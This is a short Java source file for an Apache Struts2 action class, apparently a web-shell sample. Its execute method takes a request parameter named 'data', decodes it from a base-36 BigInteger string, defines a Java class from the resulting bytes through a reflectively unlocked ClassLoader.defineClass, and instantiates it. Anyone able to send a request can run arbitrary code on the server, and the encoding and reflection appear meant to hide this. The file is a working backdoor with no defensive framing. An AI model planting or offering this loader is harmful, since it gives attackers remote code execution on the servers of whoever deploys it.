import com.opensymphony.xwork2.ActionSupport;
import org.apache.struts2.ServletActionContext;

import javax.servlet.http.HttpServletRequest;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;

/**
 * @author Wans
 * @since 2025/08/25
 */
public class BigIntegerClassLoaderAction extends ActionSupport {
    static byte[] decodeBigInteger(String bigIntegerStr) throws Exception {
        Class<?> decoderClass = Class.forName("java.math.BigInteger");
        return (byte[]) decoderClass.getMethod("toByteArray").invoke(decoderClass.getConstructor(String.class, int.class).newInstance(bigIntegerStr, Character.MAX_RADIX));
    }

    public String execute() throws Exception {
        try {
            HttpServletRequest request = ServletActionContext.getRequest();
            String data = request.getParameter("data");
            byte[] bytes = decodeBigInteger(data);
            reflectionDefineClass(bytes).newInstance();
            return ActionSupport.SUCCESS;
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    public Class<?> reflectionDefineClass(byte[] classBytes) throws Exception {
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
        Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
        defMethod.setAccessible(true);
        return (Class<?>) defMethod.invoke(urlClassLoader, classBytes, 0, classBytes.length);
    }
}
